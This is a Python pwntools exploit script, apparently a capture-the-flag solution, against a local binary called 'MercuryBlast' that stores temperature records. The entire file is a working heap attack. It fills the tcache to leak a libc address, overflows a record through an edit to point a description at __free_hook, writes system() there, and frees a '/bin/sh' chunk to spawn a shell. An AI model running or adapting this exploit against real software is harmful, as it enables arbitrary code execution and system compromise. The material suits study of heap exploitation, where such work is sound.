from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())

for i in range(8):
    add_record(0x200, b'AAAAAAAA') # 0 

# fill up the tcache
for i in range(8):
    if i == 6:
        continue
    delete_record(i)

# using 7 here would merge with top chunk 
delete_record(6)

#gdb.attach(p, s)

# reallocating the chunks (in reverse way) so that 
for i in range(7):
    add_record(0x200, b'AAAAAAAA') # 0 

# previous chunks with 0x200 description size cannot get to the glibc addresses 
# therefore allocate a new chunk 

add_record(0x10, b'BBBBBBBB')#7, 6


print_record()
p.recvuntil(b"Description: BBBBBBBB")
leak = p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')
leak = u64(leak)
print(hex(leak))
gdb.attach(p, s)
#pwndbg> x/20x 0x7fc6b1288de0 - 0x7fc6b109c000
#0x1ecde0:	Cannot access memory at address 0x1ecde0
libc.address =  leak - 0x1ecde0 # actual libc base, verified with outputs and vmmp in pwndbg
#print(hex(libc.address))
sys_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
add_record(0x200, b'AAAAAAAA')
add_record(0x100, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
print(hex(libc.address))

payload = flat(
    b'A' * 0x100, # fill up the original buffer before the new edit, in order to get to overwrite the next record

    0,      # previous data, set whatever you want
    0x21,   # the size of the chunk including header. Header is exactly 0 and 0x21, 16 bytes.
    0, # function pointer - speak. Not important at all in this exploit
    0x100, # size of the description of this chunk ( a struct ), you need 8 bytes for the address. It can also be modified in the next edit
    free_hook # overwriting the original description pointer to point to __free_hook
)

# you are editing the description of a record
edit_record(9, 0x200, payload)
# the next record that you have just been overwritten with __free_hook on the description pointer. Now turn that into sys_addr 
edit_record(10, 0x8, p64(sys_addr))
edit_record(3, 0x8, b'/bin/sh\x00') 
delete_record(3)


# now start arbirary write! using read()

p.interactive()